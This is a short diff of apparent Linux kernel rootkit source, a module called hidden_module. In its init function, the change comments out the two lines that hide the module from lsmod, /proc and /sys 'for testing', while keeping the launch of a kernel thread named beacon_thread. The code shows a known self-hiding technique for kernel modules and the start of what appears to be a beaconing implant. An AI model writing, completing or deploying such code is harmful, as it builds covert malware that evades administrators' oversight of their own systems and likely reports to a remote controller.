@@ -112,8 +112,9 @@ static int __init hidden_init(void) {
     printk(KERN_INFO "[hidden_module] Loaded.\n");
 
     // Hide from lsmod/proc/sys
-    list_del_init(&__this_module.list);
-    kobject_del(&THIS_MODULE->mkobj.kobj);
+    // removed for testing
+    // list_del_init(&__this_module.list);
+    // kobject_del(&THIS_MODULE->mkobj.kobj);
 
     beacon_thread = kthread_run(beacon_main, NULL, "beacon_thread");
     return 0;
